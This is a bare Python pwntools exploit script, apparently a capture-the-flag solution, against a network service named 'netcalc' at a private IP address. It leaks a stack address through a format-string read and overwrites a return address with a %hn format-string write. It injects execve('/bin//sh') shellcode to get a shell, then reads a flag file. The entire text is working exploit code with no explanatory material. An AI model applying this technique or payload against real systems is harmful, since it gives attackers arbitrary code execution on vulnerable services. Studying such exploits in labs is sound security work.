from pwn import *
import subprocess
import sys
import struct
import time

shellcode = \
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"



pro = remote("192.168.0.25", 12222)

pro.recvuntil("(1-3):")
pro.send("1\n")
pro.recvuntil("number:")
pro.send("%2$08x\n")
print pro.recvuntil("input:")
bufaddr = int(pro.recv(9), 16)
print "%X" % (bufaddr)
retaddr = bufaddr + 0x210 - 4
print "%X" % (retaddr)
lo, hi = struct.unpack("<HH", struct.pack("<I", bufaddr - 4 + 8))
print "%X" % (lo)
print "%X" % (hi)
pro.recvuntil("number:")

payload = ""
payload += struct.pack("<I", retaddr) # lo
payload += struct.pack("<I", retaddr + 2) # hi
payload += shellcode
payload += "%" + ("%d" % (hi - 31)) + "d"
payload += "%4$hn"
payload += "%" + ("%d" % (lo - hi)) + "d"
payload += "%3$hn"
payload += "\n"

pro.send(payload)
time.sleep(5)
pro.send("cat home/netcalc/flag.txt\n")

####################################
while True:
    print(pro.recvline())
